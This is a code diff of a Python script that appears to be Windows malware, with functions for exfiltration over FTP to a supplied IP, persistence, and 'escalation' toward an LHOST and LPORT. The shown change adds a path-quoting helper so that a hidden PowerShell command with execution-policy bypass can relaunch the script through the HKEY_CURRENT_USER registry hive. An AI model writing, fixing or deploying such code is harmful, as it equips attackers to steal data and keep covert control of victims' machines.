@@ -1,15 +1,8 @@
 import socket
-import sys
-import time
 import winreg
-import requests
-import base64
 import subprocess
 import os
 from pathlib import Path
-import shutil
-import ftplib
-
 import time
 import ftplib
 import os
@@ -18,7 +11,17 @@ import sys
 
 args = sys.argv
 
-# Parameters: IP, UserName, Password #
+
+def escape_dir_spaces_powershell(path):
+    dirs = path.split("\\")
+    for i in range(len(dirs)):
+        if " " in dirs[i]:
+            quoted = "\'" + str(dirs[i]) + "\'"
+            escape = dirs[i] = quoted
+            # print(escape)
+
+    escaped_path = "\\".join(dirs)
+    return escaped_path
 
 
 def exfiltrator(IP, User, Pass):
@@ -168,8 +171,9 @@ def persist(LHOST, LPORT):
 def escalate(LHOST, LPORT):
     file_name = Path(__file__).name
     file_path = Path(__file__).parent.absolute()
-    full_path = str(file_path) + "\\" + str(file_name)
-    program = r'powershell -ep bypass -windowstyle hidden -command "' + full_path + ' ' + LHOST + ' ' + LPORT + '"'.replace("\\", "\\\\")
+    full_path = str(str(file_path) + "\\" + str(file_name))
+    PS_formatted_path = escape_dir_spaces_powershell(full_path)
+    program = r'powershell -ep bypass -windowstyle hidden -command "' + PS_formatted_path + ' ' + LHOST + ' ' + LPORT + '"'
     # program = "cmd start /c \"" + full_path + "\""
 
     reg_path = winreg.HKEY_CURRENT_USER
